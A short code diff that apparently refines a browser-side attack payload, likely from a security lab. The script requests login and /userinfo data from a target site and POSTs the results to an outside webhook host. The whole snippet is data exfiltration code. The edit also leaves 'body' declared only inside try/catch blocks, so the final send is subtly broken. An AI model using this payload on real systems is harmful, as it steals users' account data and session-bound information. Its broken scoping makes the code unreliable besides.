@@ -23,18 +23,26 @@
 			});
 			const loginData = await loginRes.text();
 
-			const res = await fetch('https://login.sketchycompany.upd-dcs.work/userinfo', {
-				method: 'GET'
-			});
-			const data = await res.json();
+			try {
+				const res = await fetch('https://login.sketchycompany.upd-dcs.work/userinfo', {
+					method: 'GET'
+				});
+				const data = await res.json();
 
-			const body = {
-				userInfo: data,
-				login: loginData
+				const body = {
+					userInfo: data,
+					login: loginData
+				}
+			} catch (e) {
+				const body = {
+					login: loginData,
+					error: e.message
+				}
 			}
 
 			await fetch('https://hkdk.events/lxjnpl4yoq2m7x', {
 				method: 'POST',
+				headers: { 'Content-Type': 'application/json' },
 				body: JSON.stringify(body),
 			});
 		})();
